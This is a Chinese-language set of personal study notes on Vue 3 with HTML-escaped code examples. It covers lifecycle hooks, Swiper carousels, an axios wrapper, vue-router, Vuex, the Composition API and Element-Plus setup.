&lt;template&gt;        &lt;h3&gt;组件生命周期&lt;/h3&gt;        &lt;button @click=&quot;Increment&quot;&gt;count = &#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data() &#123;                return &#123;                        count: 0                &#125;        &#125;,        methods: &#123;                Increment() &#123;                        this.count += 1;                &#125;,        &#125;,        beforeCreate() &#123;                console.log(&#x27;创建前&#x27;);        &#125;,        created() &#123;                console.log(&#x27;已创建&#x27;);        &#125;,        beforeMount() &#123;                console.log(&#x27;挂载前&#x27;);        &#125;,        mounted() &#123;                console.log(&#x27;已挂载&#x27;);        &#125;,        beforeUpdate() &#123;                console.log(&#x27;更新前&#x27;);        &#125;,        updated() &#123;                console.log(&#x27;更新后&#x27;);        &#125;&#125;&lt;/script&gt;&lt;style&gt;h3 &#123;        color: crimson;&#125;&lt;/style&gt;

结果：

Vue引入第三方https://github.com/vuejs/awesome-vue
Swiper官方文档:https://swiperjs.com/vue
必须引入Swiper和SwiperSlide组件和swiper&#x2F;css中的样式
#引入swiper,指定8.1.6版本npm install --save swiper@8.1.6

&lt;template&gt;        &lt;Swiper&gt;                &lt;SwiperSlide&gt;                        &lt;img src=&quot;../assets/logo.png&quot;&gt;                &lt;/SwiperSlide&gt;                &lt;SwiperSlide&gt;                        &lt;img src=&quot;../assets/logo.png&quot;&gt;                &lt;/SwiperSlide&gt;                &lt;SwiperSlide&gt;                        &lt;img src=&quot;../assets/logo.png&quot;&gt;                &lt;/SwiperSlide&gt;        &lt;/Swiper&gt;&lt;/template&gt;&lt;script&gt;import &#123; Swiper, SwiperSlide &#125; from &#x27;swiper/vue&#x27;;//引入组件import &#x27;swiper/css&#x27;;//引入样式export default &#123;        name: &#x27;HelloWorld&#x27;,        components: &#123;//注入组件                Swiper,                SwiperSlide        &#125;&#125;&lt;/script&gt;&lt;style scoped&gt;&lt;/style&gt;

添加指示器//script标签中加上import &#123; Pagination &#125; from &#x27;swiper&#x27;;import &#x27;swiper/css/pagination&#x27;;//export default块中data()&#123;    return&#123;        modules:[Pagination]    &#125;&#125;//Swiper标签中加上 :modules=&quot;modules&quot; :pagination=&quot;&#123;clickable:true&#125;&quot;

&lt;template&gt;        &lt;Swiper :modules=&quot;modules&quot; :pagination=&quot;&#123;clickable:true&#125;&quot;&gt;                &lt;SwiperSlide&gt;                        &lt;img src=&quot;../assets/logo.png&quot;&gt;                &lt;/SwiperSlide&gt;                &lt;SwiperSlide&gt;                        &lt;img src=&quot;../assets/logo.png&quot;&gt;                &lt;/SwiperSlide&gt;                &lt;SwiperSlide&gt;                        &lt;img src=&quot;../assets/logo.png&quot;&gt;                &lt;/SwiperSlide&gt;        &lt;/Swiper&gt;&lt;/template&gt;&lt;script&gt;import &#123; Pagination &#125; from &#x27;swiper&#x27;;import &#123; Swiper, SwiperSlide &#125; from &#x27;swiper/vue&#x27;;import &#x27;swiper/css&#x27;;import &#x27;swiper/css/pagination&#x27;;export default &#123;        name: &#x27;HelloWorld&#x27;,        data()&#123;                return&#123;                        modules:[Pagination]                &#125;        &#125;,        components: &#123;                Swiper,                SwiperSlide        &#125;&#125;&lt;/script&gt;&lt;!-- Add &quot;scoped&quot; attribute to limit CSS to this component only --&gt;&lt;style scoped&gt;&lt;/style&gt;

效果:

生命周期应用通过ref获取元素DOM结构获取DOM的时机：
不能是创建期：UI还未渲染到页面上，无DOM结构
挂载期：挂载前不行，理由同上；挂载后（mounted）可以
更新期与销毁期也可以
&lt;template&gt;        &lt;!-- 要获取的DOM --&gt;        &lt;p ref=&quot;name&quot;&gt;ref~&lt;/p&gt;&lt;/template&gt;&lt;script&gt;        export default&#123;                mounted()&#123;                        console.log(this.$refs.name);//this.$refs.name获取                &#125;        &#125;&lt;/script&gt;&lt;!-- 根组件 --&gt;&lt;template&gt;        &lt;User /&gt;&lt;/template&gt;&lt;script&gt;import User from &#x27;./components/User.vue&#x27;export default&#123;        components:&#123;                User        &#125;&#125;&lt;/script&gt;



模拟网络请求渲染数据时机：
created:先获取到数据，但是还没渲染
mounted：先渲染再获取数据
我们选择后者的逻辑
AXios网络请求封装cnpm install --save axioscnpm install --save querystringvue create demonpm run serve

在src下新建一个目录utils，创建文件request.js来封装网络请求
import querystring from &#x27;querystring&#x27;import axios from &#x27;axios&#x27;import &#123; config &#125; from &#x27;process&#x27;;import &#123; log &#125; from &#x27;console&#x27;;const instance = axios.create(&#123;        //网络请求的公共属性        timeout: 10000 //ms&#125;)//处理错误const errorHandle = (status,info) =&gt; &#123;        switch(status)&#123;                default:                        console.log(info);        &#125;&#125;//常用于拦截器//发送数据前requestinstance.interceptors.request.use(        //成功        config =&gt; &#123;//config包含网络请求所有信息                if(config.method === &#x27;post&#x27;)&#123;//对post请求特殊处理,axios中post返回json格式，querystring.stringify转换为url编码                        config.data = querystring.stringify(config.data);                &#125;                return config;        &#125;,        //失败        error =&gt; &#123;                //Promise.reject(error)会将错误抛出，从而可以在调用axios的地方通过 .catch()捕获错误                return Promise.reject(error);        &#125;);//获取数据前responseinstance.interceptors.response.use(        //成功        response =&gt; &#123;                return response.status===200?Promise.resolve(response):Promise.reject(response)        &#125;,        //失败        error =&gt; &#123;                //将error.response赋给response                const &#123;response&#125; = error;                errorHandle(response.status,response.info);        &#125;);export default instance;

将网络请求集中放在src&#x2F;api中

//path.jsconst Base = &#123;        //公共路径        baseURL: &quot;&quot;,        //拼在后面的        extra:&quot;&quot;&#125;export default Base;//index.jsimport axios from &quot;../utils/request&quot;;import path from &quot;./path&quot;;const api = &#123;        get()&#123;                return axios.get(path.baseURL+path.extra);        &#125;&#125;export default api;

动态组件&lt;template&gt;  &lt;component :is=&quot;Component&quot;&gt;&lt;/component&gt; &lt;!-- :is来控制当前组件 --&gt;  &lt;button @click=&quot;changeComponent&quot;&gt;切换组件&lt;/button&gt;&lt;/template&gt;&lt;script&gt;import A from &#x27;./components/A.vue&#x27;;import B from &#x27;./components/B.vue&#x27;;export default &#123;  data() &#123;    return &#123;      Component: A, // 初始组件      componentsList: [A, B], // 组件列表      currentIndex: 0, // 当前组件索引    &#125;;  &#125;,  methods: &#123;    changeComponent() &#123;      // 切换组件      this.currentIndex = (this.currentIndex + 1) % this.componentsList.length;      this.Component = this.componentsList[this.currentIndex];    &#125;,  &#125;,&#125;;&lt;/script&gt;

路由路由配置
1.安装路由
npm install --save vue-router@4 #不使用@4的话,createWebHashHistory和createRouter不能同时使用vue create democd demonpm run serve

2.配置独立的路由文件&#x2F;src&#x2F;route&#x2F;index.js
//index.jsimport &#123; createRouter,createWebHashHistory &#125; from &quot;vue-router&quot;;import Home from &#x27;../view/Home.vue&#x27;;/** * 页面的配置信息 * path:路径 * component:组件    */    const routes = [        &#123;path:&#x27;/&#x27;,component:Home&#125;,        //@通常指向src目录;()=&gt;import()属于异步加载,指向这个路径时才会挂载        &#123;path:&#x27;/about&#x27;,component:() =&gt; import(&#x27;@/view/About.vue&#x27;)&#125;    ];const router = createRouter(&#123;        history:createWebHashHistory(),        routes,&#125;);export default router;/** * createWebHashHistory()和createWebHistory()的区别 *  * createWebHashHistory(): * 路径是这样的:/#/path... *      不需要后端配合重定向 *      原理:&lt;a&gt;的锚点链接 * createWebHistory(): *      路径是这样的:/path... *      需要后端配合重定向,不然会404 *      原理:H5 pushState() */

3.在main.js中注册组件
//main.jsimport &#123; createApp &#125; from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import &#x27;./registerServiceWorker&#x27;import router from &#x27;./route&#x27;//在mount前用use(router)注册组件createApp(App).use(router).mount(&#x27;#app&#x27;);




&lt;!-- App.vue --&gt;&lt;template&gt;        &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;		&lt;!-- 路由跳转 --&gt;        &lt;RouterLink to=&quot;/&quot;&gt;首页 |&lt;/RouterLink&gt;        &lt;RouterLink to=&quot;/about&quot;&gt; 关于&lt;/RouterLink&gt;		&lt;!-- 路由的显示入口 --&gt;        &lt;router-view&gt;&lt;/router-view&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        name: &#x27;App&#x27;,&#125;&lt;/script&gt;&lt;style&gt;#app &#123;        font-family: Avenir, Helvetica, Arial, sans-serif;        -webkit-font-smoothing: antialiased;        -moz-osx-font-smoothing: grayscale;        text-align: center;        color: #2c3e50;        margin-top: 60px;&#125;&lt;/style&gt;

传递参数创建vue项目时把Router也勾选上

1.在routers数组中的path:’&#x2F;path&#x2F;:参数名’
2.传递参数:router-link的to中’&#x2F;path&#x2F;参数值’
3.读取参数 
//index.jsimport &#123; createRouter, createWebHashHistory &#125; from &#x27;vue-router&#x27;import HomeView from &#x27;../views/HomeView.vue&#x27;const routes = [  &#123;    path: &#x27;/&#x27;,    name: &#x27;home&#x27;,    component: HomeView  &#125;,  &#123;    path: &#x27;/about&#x27;,    name: &#x27;about&#x27;,    component: () =&gt; import(&#x27;../views/AboutView.vue&#x27;)  &#125;,  &#123;    path:&#x27;/news&#x27;,    //@通常指向src目录;()=&gt;import()属于异步加载,指向这个路径时才会挂载    component: ()=&gt;import(&#x27;@/views/News.vue&#x27;)  &#125;,  &#123;    path:&#x27;/news/details/:name&#x27;,    //@通常指向src目录;()=&gt;import()属于异步加载,指向这个路径时才会挂载    component: ()=&gt;import(&#x27;@/views/NewsDetails.vue&#x27;)  &#125;]const router = createRouter(&#123;  history: createWebHashHistory(),  routes&#125;)export default router

&lt;!-- 读取参数 --&gt;&lt;template&gt;        &lt;h3&gt;平台:&lt;/h3&gt;        &lt;p&gt;&#123;&#123; $route.params.name &#125;&#125;&lt;/p&gt;&lt;/template&gt;

嵌套路由配置在页面配置信息的routes数组中的对象中加上children数组，填上子页面的信息(路径不能有&#x2F;)
如果希望默认打开某个子页面,用redirect重定向
//index.jsimport &#123; createRouter, createWebHashHistory &#125; from &#x27;vue-router&#x27;import HomeView from &#x27;../views/HomeView.vue&#x27;const routes = [  &#123;    path: &#x27;/&#x27;,    name: &#x27;home&#x27;,    component: HomeView  &#125;,  &#123;    path: &#x27;/about&#x27;,    name: &#x27;about&#x27;,    component: () =&gt; import(&#x27;../views/AboutView.vue&#x27;),    //默认的子导航    redirect:&#x27;/about/us&#x27;,    //子导航    children:[      &#123;        //子导航不加/        path:&#x27;us&#x27;,        component: () =&gt; import(&#x27;../views/AboutUs.vue&#x27;)      &#125;,      &#123;        path:&#x27;info&#x27;,        component: () =&gt; import(&#x27;../views/AboutInfo.vue&#x27;)      &#125;    ]  &#125;]const router = createRouter(&#123;  history: createWebHashHistory(),  routes&#125;)export default router

Vue状态管理(Vuex)

store就相当于集中式存储管理
引入步骤1.安装Vuex
cnpm install --save vuex

2.配置文件&#x2F;src&#x2F;store&#x2F;index.js
import &#123; createStore &#125; from &#x27;vuex&#x27;//Vuex的作用就是管理组件间状态的export default createStore(&#123;        //所有状态都放在这里(数据),可以被所有组件读取        state:&#123;                count:0        &#125;&#125;);

3.main.js中use()
import &#123; createApp &#125; from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import &#x27;./registerServiceWorker&#x27;import store from &#x27;@/store&#x27;createApp(App).use(store).mount(&#x27;#app&#x27;)

3.访问数据
&lt;template&gt;        &lt;!-- 方法1 --&gt;        &lt;p&gt;&#123;&#123; $store.state.count &#125;&#125;&lt;/p&gt;        &lt;!-- 方法2 --&gt;        &lt;p&gt;&#123;&#123; count &#125;&#125;&lt;/p&gt;&lt;/template&gt;&lt;script&gt;        // &lt;!-- 方法2 --&gt;        import &#123; mapState &#125; from &#x27;vuex&#x27;;        export default&#123;                computed:&#123;                        ...mapState([&#x27;count&#x27;])                &#125;        &#125;;&lt;/script&gt;



Vue状态管理核心(Vuex)
Getter对Vuex中数据进行过滤
import &#123; createStore &#125; from &#x27;vuex&#x27;export default createStore(&#123;        state: &#123;                count:0        &#125;,        getters: &#123;            	//要传入state                getCount(state)&#123;                        return state.count&gt;0?state.count:&#x27;太小了!!!!!!&#x27;;                &#125;        &#125;,&#125;)

&lt;template&gt;  &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;  &lt;p&gt;访问方法1=&gt;&#123;&#123; $store.getters.getCount &#125;&#125;&lt;/p&gt;  &lt;p&gt;访问方法2=&gt;&#123;&#123; getCount &#125;&#125;&lt;/p&gt;&lt;/template&gt;&lt;script&gt;import &#123; mapGetters &#125; from &#x27;vuex&#x27;export default &#123;  computed:&#123;    ...mapGetters([&#x27;getCount&#x27;])  &#125;&#125;&lt;/script&gt;

Mutation
//index.jsimport &#123; createStore &#125; from &#x27;vuex&#x27;export default createStore(&#123;        state: &#123;                count: 0        &#125;,        mutations: &#123;                addCount(state) &#123;                        state.count++;                &#125;        &#125;&#125;)

调用方法
&lt;template&gt;        &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;        &lt;p&gt;访问方法1=&gt;&#123;&#123; $store.getters.getCount &#125;&#125;&lt;/p&gt;        &lt;p&gt;访问方法2=&gt;&#123;&#123; getCount &#125;&#125;&lt;/p&gt;        &lt;button @click=&quot;addCountHandle&quot;&gt;Click~&lt;/button&gt;&lt;/template&gt;&lt;script&gt;import &#123; mapGetters &#125; from &#x27;vuex&#x27;export default &#123;        computed: &#123;                ...mapGetters([&#x27;getCount&#x27;])        &#125;,        methods: &#123;                addCountHandle() &#123;                        this.$store.commit(&#x27;addCount&#x27;);//this.$store.commit(&#x27;mutations中的方法名&#x27;)                &#125;        &#125;&#125;&lt;/script&gt;&lt;!-- 或者可以这样写 --&gt;&lt;script&gt;import &#123; mapGetters,mapMutations &#125; from &#x27;vuex&#x27;export default &#123;        computed: &#123;                ...mapGetters([&#x27;getCount&#x27;])        &#125;,        methods: &#123;                ...mapMutations([&#x27;addCount&#x27;]),                addCountHandle() &#123;                        this.addCount();                &#125;        &#125;&#125;&lt;/script&gt;

Action
import &#123; createStore &#125; from &#x27;vuex&#x27;import axios from &#x27;axios&#x27;export default createStore(&#123;        state: &#123;                count: 0        &#125;,        getters: &#123;                getCount(state) &#123;                        return state.count &gt; 0 ? state.count : &#x27;太小了!!!!!!&#x27;;                &#125;        &#125;,        mutations: &#123;                addCount(state) &#123;                        state.count++;                &#125;        &#125;,    	//只能异步        actions: &#123;                //&#123;commit&#125;:固定写法                asyncAddCount(&#123; commit &#125;) &#123;                        axios.get(&#x27;&#x27;)//axios封装网络请求                        .then(                                res=&gt;&#123;                                        commit(&#x27;addCount&#x27;);                                &#125;                        )                &#125;        &#125;&#125;)

&lt;template&gt;        &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;        &lt;p&gt;访问方法1=&gt;&#123;&#123; $store.getters.getCount &#125;&#125;&lt;/p&gt;        &lt;p&gt;访问方法2=&gt;&#123;&#123; getCount &#125;&#125;&lt;/p&gt;        &lt;button @click=&quot;addCountHandle&quot;&gt;Click~&lt;/button&gt;        &lt;button @click=&quot;AsyncAddCountHandle&quot;&gt;Click~&lt;/button&gt;&lt;/template&gt;&lt;script&gt;import &#123; mapGetters,mapMutations &#125; from &#x27;vuex&#x27;export default &#123;        computed: &#123;                ...mapGetters([&#x27;getCount&#x27;])        &#125;,        methods: &#123;                ...mapMutations([&#x27;addCount&#x27;]),                addCountHandle() &#123;                        this.addCount();                &#125;,                AsyncAddCountHandle()&#123;                        this.$store.dispatch(&#x27;asyncAddCount&#x27;);                &#125;        &#125;&#125;&lt;/script&gt;

Vue3新特性
ref或reactive组合式API替换data(){},在setup()中声明变量（必须return）
vue2.x中在data的return中声明
&lt;template&gt;        &lt;h3&gt;vue3特性&lt;/h3&gt;        &lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt;&lt;/template&gt;&lt;script&gt;        export default&#123;                data()&#123;                        return&#123;                                message:&quot;message&quot;                        &#125;                &#125;        &#125;&lt;/script&gt;

用ref或reactive进行声明
&lt;template&gt;        &lt;h3&gt;vue3特性&lt;/h3&gt;        &lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt;        &lt;ul&gt;                &lt;li v-for=&quot;(item,index) in name.list&quot; :key=&quot;index&quot;&gt;&#123;&#123; item &#125;&#125;&lt;/li&gt;        &lt;/ul&gt;&lt;/template&gt;&lt;script&gt;import &#123;reactive, ref&#125; from &#x27;vue&#x27;        export default&#123;                //组合式API必须要有setup                setup()&#123;                        //ref                        const message = ref(&quot;ref&quot;);                        //reactive:用于对象                        const name = reactive(&#123;                                list:[&#x27;111&#x27;,&#x27;222&#x27;,&#x27;333&#x27;]                        &#125;)                        //必须return                        return&#123;                                message,                                name//name是一个对象，要访问的是name.list                        &#125;                &#125;        &#125;&lt;/script&gt;

methods中定义的方法写在setup()&lt;template&gt;        &lt;h3&gt;vue3特性&lt;/h3&gt;        &lt;button @click=&quot;Increment&quot;&gt;count = &#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;script&gt;import &#123; reactive, ref &#125; from &#x27;vue&#x27;export default &#123;        //组合式API必须要有setup        setup() &#123;                let count = ref(0);                const Increment = () =&gt; &#123;                        //ref返回的是一个对象,要访问它的值需要.value                        count.value += 1;                &#125;;                return &#123;                        count,                    //函数作为变量返回                        Increment                &#125;        &#125;&#125;&lt;/script&gt;

setup()中使用props和content
&lt;template&gt;        &lt;h3&gt;vue3特性&lt;/h3&gt;        &lt;button @click=&quot;Increment&quot;&gt;count = &#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;script&gt;import &#123; reactive, ref &#125; from &#x27;vue&#x27;export default &#123;        //组合式API必须要有setup        setup(props) &#123;                //props是一个Proxy代理对象        &#125;&#125;&lt;/script&gt;


&lt;template&gt;        &lt;h3&gt;vue3特性&lt;/h3&gt;&lt;/template&gt;&lt;script&gt;// import &#123; reactive, ref &#125; from &#x27;vue&#x27;export default &#123;        //这步不能省略        props: &#123;                message: String//只需要声明类型        &#125;,        setup(props) &#123;                console.log(props.message)        &#125;&#125;&lt;/script&gt;&lt;template&gt;        &lt;HelloWorld message=&quot;msg&quot; /&gt;&lt;/template&gt;&lt;script&gt;import HelloWorld from &#x27;./components/HelloWorld.vue&#x27;;export default &#123;        components:&#123;                HelloWorld        &#125;&#125;&lt;/script&gt;

&lt;template&gt;        &lt;h3&gt;vue3特性&lt;/h3&gt;        &lt;h3&gt;&#123;&#123; msg &#125;&#125;&lt;/h3&gt;&lt;/template&gt;&lt;script&gt;// import &#123; reactive, ref &#125; from &#x27;vue&#x27;export default &#123;        //这步不能省略        props: &#123;                message: String//只需要声明类型        &#125;,        setup(props) &#123;                //也通过这样声明，返回回去可以显示在页面上                const msg = props.message;                return &#123;                        msg,                &#125;        &#125;&#125;&lt;/script&gt;

setup中无法使用this获取实例对象，使用content可以获取实例对象
setup()中使用生命周期函数优势：setup中可以同时存在多个生命周期函数

&lt;template&gt;        &lt;h3&gt;vue3特性&lt;/h3&gt;        &lt;h3&gt;&#123;&#123; msg &#125;&#125;&lt;/h3&gt;&lt;/template&gt;&lt;script&gt;import &#123; onBeforeMount, onBeforeUnmount, onBeforeUpdate, onMounted, onUnmounted, onUpdated &#125; from &#x27;vue&#x27;;export default &#123;        setup() &#123;                //内部是箭头函数                onMounted(() =&gt; &#123;                        console.log(&#x27;onMounted1&#x27;);                                        &#125;),                onMounted(() =&gt; &#123;                        console.log(&#x27;onMounted2&#x27;);                &#125;),                onBeforeMount(() =&gt; &#123;                &#125;),                onUpdated(() =&gt; &#123;                &#125;),                onBeforeUpdate(() =&gt; &#123;                &#125;),                onUnmounted(() =&gt; &#123;                &#125;),                onBeforeUnmount(() =&gt; &#123;                &#125;)        &#125;&#125;&lt;/script&gt;

Provide&#x2F;Inject
可以跨层级传递，但是必须从上至下
&lt;!-- HelloWorld.vue --&gt;&lt;template&gt;        &lt;h3&gt;&#123;&#123; msg &#125;&#125;&lt;/h3&gt;&lt;/template&gt;&lt;script&gt;import &#123; inject &#125; from &#x27;vue&#x27;;        export default&#123;                setup()&#123;                        const msg = inject(&quot;msg&quot;);                        return&#123;                                msg                        &#125;                &#125;        &#125;&lt;/script&gt;&lt;!-- App.vue --&gt;&lt;template&gt;        &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;        &lt;HelloWorld/&gt;&lt;/template&gt;&lt;script&gt;import &#123; provide &#125; from &#x27;vue&#x27;;import HelloWorld from &#x27;./components/HelloWorld.vue&#x27;export default &#123;        name: &#x27;App&#x27;,        components: &#123;                HelloWorld        &#125;,        setup() &#123;                provide(&quot;msg&quot;,&quot;provide的消息&quot;)        &#125;&#125;&lt;/script&gt;&lt;style&gt;#app &#123;        font-family: Avenir, Helvetica, Arial, sans-serif;        -webkit-font-smoothing: antialiased;        -moz-osx-font-smoothing: grayscale;        text-align: center;        color: #2c3e50;        margin-top: 60px;&#125;&lt;/style&gt;

Fragment
Element-Plus官网:https://element-plus.sxtxhy.com/zh-CN/
安装npm install element-plus --save

完整引入
//main.jsimport &#123; createApp &#125; from &#x27;vue&#x27;import ElementPlus from &#x27;element-plus&#x27;//引入组件import &#x27;element-plus/dist/index.css&#x27;//必须引入css样式import App from &#x27;./App.vue&#x27;import &#x27;./registerServiceWorker&#x27;createApp(App).use(ElementPlus).mount(&#x27;#app&#x27;)//.use挂载组件

在官网上复制相关组件的代码
按需引入
npm install -D unplugin-vue-components unplugin-auto-import


//vue.config.jsconst &#123; defineConfig &#125; = require(&#x27;@vue/cli-service&#x27;)const AutoImport = require(&#x27;unplugin-auto-import/webpack&#x27;)const Components = require(&#x27;unplugin-vue-components/webpack&#x27;)const &#123; ElementPlusResolver &#125; = require(&#x27;unplugin-vue-components/resolvers&#x27;)module.exports = defineConfig(&#123;  transpileDependencies: true,  configureWebpack: &#123;    plugins: [      AutoImport(&#123;        resolvers: [ElementPlusResolver()]      &#125;),      Components(&#123;        resolvers: [ElementPlusResolver()]      &#125;)    ]  &#125;&#125;)



加载字体图标npm update unplugin-auto-import unplugin-vue-componentsnpm install @element-plus/icons-vue

全局注册创建&#x2F;src&#x2F;plugins&#x2F;icon.js

//icon.jsimport * as components from &quot;@element-plus/icons-vue&quot;;export default &#123;        install: (app) =&gt; &#123;                for (const key in components) &#123;                        const componentConfig = components[key];                        app.component(componentConfig.name, componentConfig);                &#125;        &#125;,&#125;;

//main.jsimport &#123; createApp &#125; from &#x27;vue&#x27;import App from &#x27;./App.vue&#x27;import &#x27;./registerServiceWorker&#x27;import &#x27;element-plus/dist/index.css&#x27;import icon from &#x27;./plugins/icon&#x27;//引入icon.jscreateApp(App).use(icon).mount(&#x27;#app&#x27;)

然后从官网复制图像的代码
Vue应用应用实例
Vue的实例对象有且仅有一个
根组件
挂载应用
#app会去index.html(与src同级)中寻找dom元素app

&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;        &lt;meta charset=&quot;UTF-8&quot;&gt;        &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;        &lt;title&gt;Vue&lt;/title&gt;&lt;/head&gt;&lt;body&gt;        &lt;div id=&quot;app&quot;&gt;                111        &lt;/div&gt;        &lt;script type=&quot;module&quot; src=&quot;/src/main.js&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;



公共资源
两种风格的API选项式API
npm init vue@latest

&lt;template&gt;        &lt;button @click=&quot;Increment&quot;&gt;count = &#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data() &#123;                return &#123;                        count: 0                &#125;        &#125;,        methods: &#123;                Increment() &#123;                        this.count++;                &#125;        &#125;&#125;&lt;/script&gt;&lt;template&gt;  &lt;Options /&gt;&lt;/template&gt;&lt;script&gt;import Options from &#x27;./components/Options.vue&#x27;;export default&#123;  components:&#123;    Options  &#125;&#125;&lt;/script&gt;



组合式API
&lt;template&gt;        &lt;button @click=&quot;Increment&quot;&gt;count = &#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;!-- 使用 &lt;script setup&gt; 语法糖，不用显式返回对象 --&gt;&lt;script setup&gt;        import &#123;ref,onMounted&#125; from &#x27;vue&#x27;        const count = ref(0);        function Increment()&#123;                count.value ++;        &#125;        onMounted(()=&gt;&#123;        &#125;)&lt;/script&gt;

简约写法&lt;script setup&gt;&lt;/script&gt;

是一种语法糖，不用在setup()中显式return,直接在template中{{ }}调用就行，但是就不能组合式与选项式混写，只能组合式

组合式与选项式的区别
响应式组合式&lt;template&gt;        &lt;h3&gt;&#123;&#123; message &#125;&#125;&lt;/h3&gt;&lt;br&gt;        &lt;h3&gt;&#123;&#123; obj.name &#125;&#125;&lt;/h3&gt;&lt;/template&gt;&lt;!-- &lt;script setup&gt;语法糖，不用显示return&#123;&#125; --&gt;&lt;script setup&gt;import &#123; reactive, ref &#125; from &#x27;vue&#x27;;const message=ref(&quot;Com~&quot;);const obj = reactive(&#123;        name:&quot;jellycat&quot;,        message:message&#125;)&lt;/script&gt;



选项式&lt;template&gt;        &lt;h3&gt;&#123;&#123; message &#125;&#125;&lt;/h3&gt;&lt;br&gt;&lt;/template&gt;&lt;script&gt;        export default&#123;                data()&#123;                        return&#123;                                message:&quot;Options!&quot;                        &#125;                &#125;        &#125;&lt;/script&gt;

计算属性组合式&lt;template&gt;        &lt;h3&gt;Com-reverse:&#123;&#123; res &#125;&#125;&lt;/h3&gt;&lt;/template&gt;&lt;script setup&gt;        import &#123; ref,computed &#125; from &#x27;vue&#x27;;        const message = ref(&quot;Hello World!&quot;);        const res = computed(() =&gt;&#123;                //调用ref对象的值必须.value                return message.value.split(&quot;&quot;).reverse().join(&#x27;&#x27;);        &#125;)&lt;/script&gt;


优势：可以把内容单独拆到一个文件中
eg：
import &#123; computed &#125; from &#x27;vue&#x27;;export function MyDemo(message) &#123;        const demo =  computed(() =&gt; &#123;                return message.value + &quot;114514&quot;;        &#125;)        return demo&#125;

&lt;template&gt;        &lt;h3&gt;Com-reverse:&#123;&#123; res &#125;&#125;&lt;/h3&gt;        &lt;h3&gt;demo:&#123;&#123; res1 &#125;&#125;&lt;/h3&gt;&lt;/template&gt;&lt;script setup&gt;        import &#123; ref,computed &#125; from &#x27;vue&#x27;;        import &#123;MyDemo&#125; from &#x27;./Comcomputedsingle&#x27;//引入函数        const message = ref(&quot;Hello World!&quot;);        const res = computed(() =&gt;&#123;                //调用ref对象的值必须.value                return message.value.split(&quot;&quot;).reverse().join(&#x27;&#x27;);        &#125;)        const res1 = MyDemo(message);&lt;/script&gt;



选项式&lt;template&gt;        &lt;h3&gt;Opt-Reverse:&#123;&#123; Fliter &#125;&#125;&lt;/h3&gt;&lt;/template&gt;&lt;script&gt;export default&#123;        data()&#123;                return &#123;                        message:&quot;Hello World!&quot;                &#125;        &#125;,        computed:&#123;                Fliter()&#123;                        return this.message.split(&quot;&quot;).reverse().join();                &#125;        &#125;&#125;&lt;/script&gt;

组合式API_事件处理&lt;template&gt;        &lt;button @click=&quot;Increment&quot;&gt;选项式API:Count = &#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;br&gt;&lt;/template&gt;&lt;script&gt;export default&#123;        data()&#123;                return&#123;                        count:0                &#125;        &#125;,        methods:&#123;                Increment()&#123;                        this.count++                &#125;        &#125;&#125;&lt;/script&gt;&lt;template&gt;        &lt;button @click=&quot;Increment&quot;&gt;组合式API: count = &#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;script setup&gt;         import &#123;ref&#125; from &#x27;vue&#x27;         const count = ref(0);         function Increment()&#123;                count.value++;         &#125;&lt;/script&gt;

组合式API_侦听器
&lt;template&gt;        &lt;button @click=&quot;Increment&quot;&gt;&#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;script&gt;        export default&#123;                data()&#123;                        return&#123;                                count:0                        &#125;                &#125;,                methods:&#123;                        Increment()&#123;                                this.count++                        &#125;                &#125;,                watch:&#123;                        //方法名就是要监听的变量                        count(OldValue,NewValue)&#123;                                console.log(OldValue,NewValue);                        &#125;                &#125;        &#125;&lt;/script&gt;

&lt;template&gt;        &lt;button @click=&quot;Increment&quot;&gt;&#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;script setup&gt;        import &#123;ref,watch&#125; from &#x27;vue&#x27;        count = ref(0);        function Increment()&#123;                count.value++        &#125;;        //参数1:要监听的变量,残数2:带两个参数的箭头函数        watch(count,(OldValue,NewValue) =&gt; &#123;                console.log(OldValue,NewValue);        &#125;)&lt;/script&gt;

将侦听器放到单独一个文件中
import &#123;watch&#125; from &#x27;vue&#x27;export function Watcher(count)&#123;        watch(count,(OldValue,NewValue) =&gt; &#123;                console.log(OldValue,NewValue);                        &#125;)&#125;

注意:watch监听时，ref对象不需要.value
组合式API_生命周期&lt;!-- 选项式 --&gt;&lt;template&gt;&lt;/template&gt;&lt;script&gt;export default&#123;        beforeCreate()&#123;        &#125;,        created()&#123;        &#125;,        beforeMount()&#123;        &#125;,        mounted()&#123;        &#125;,        beforeUpdate()&#123;        &#125;,        updated()&#123;        &#125;,        beforeUnmount()&#123;        &#125;,        unmounted()&#123;                        &#125;&#125;&lt;/script&gt;

&lt;!-- 组合式API,优点是可以同时存在多个生命周期函数 --&gt;&lt;template&gt;&lt;/template&gt;&lt;script&gt;        import &#123; onMounted, onUpdated &#125; from &#x27;vue&#x27;        onMounted(() =&gt; &#123;        &#125;),        onUpdated(() =&gt; &#123;        &#125;)&lt;/script&gt;

